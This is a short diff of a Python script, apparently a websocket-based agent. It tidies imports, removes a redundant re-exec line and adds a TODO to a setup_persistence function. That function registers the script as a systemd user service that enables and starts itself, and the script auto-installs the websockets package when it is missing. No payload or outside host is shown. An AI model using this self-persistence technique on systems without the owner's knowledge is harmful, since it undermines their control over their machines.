@@ -4,7 +4,6 @@ import os
 import subprocess
 import pickle
 import time
-import io
 import sys
 import json
 import urllib.request, urllib.parse
@@ -17,7 +16,6 @@ try:
 except:
 	subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "websockets"])
 	os.execv(sys.executable, [sys.executable] + sys.argv)
-	os.execv(__file__, sys.argv)
 
 script_path = os.path.abspath(__file__)
 state_path = script_path + ".pkl"
@@ -63,7 +61,7 @@ def setup_persistence():
 
 	os.makedirs(sysd_dir, exist_ok=True)
 	with open(service_path, "w") as f:
-		f.write(SERVICE_CONFIG.format(script_path))
+		f.write(SERVICE_CONFIG.format(script_path)) # TODO: include sys.executable in case __file__ isn't executable
 
 	subprocess.run(["systemctl", "--user", "enable", service_name])
 	subprocess.run(["systemctl", "--user", "start", service_name])
